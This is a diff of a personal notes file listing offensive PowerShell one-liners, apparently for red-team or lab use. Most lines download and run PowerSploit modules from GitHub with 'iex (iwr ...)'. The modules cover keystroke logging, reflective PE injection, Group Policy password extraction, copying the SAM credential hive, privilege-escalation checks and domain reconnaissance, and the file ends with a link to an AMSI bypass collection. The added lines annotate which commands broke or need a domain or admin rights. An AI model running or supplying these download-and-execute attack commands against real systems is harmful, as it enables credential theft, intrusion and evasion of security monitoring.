@@ -9,12 +9,14 @@ iex (iwr https://raw.githubusercontent.com/clr2of8/PowerSploit/master/Exfiltrati
 Get-Keystrokes
 cat $env:temp\key.log
 
+# problems: broke
 iex( iwr https://raw.githubusercontent.com/clr2of8/PowerSploit/master/CodeExecution/Invoke-ReflectivePEInjection.ps1 -usebasicparsing)
 https://github.com/PowerShellMafia/PowerSploit/blob/c722f89a29fe81b2e554de3b03101794e4ad6aaa/CodeExecution/Invoke-ReflectivePEInjection.ps1
 * also broke
 $PEBytes = Get-Content C:\Windows\System32\notepad.exe -Encoding Byte -Raw
 Invoke-ReflectivePEInjection -PEBytes $PEBytes -FuncReturnType WString
 
+# problems: requires domain joined
 iex( iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1 -usebasicparsing)
 
 # admin privs required
@@ -23,9 +25,11 @@ Invoke-NinjaCopy -path C:\Windows\System32\config\SAM -LocalDestination $env:Tem
 
 # user context ok
 iex( iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1 -usebasicparsing)
+Invoke-AllChecks
 
 # user context ok
 iex( iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 -usebasicparsing)
+Get-NetLocalGroupMember
 
 # user context ok
 https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell
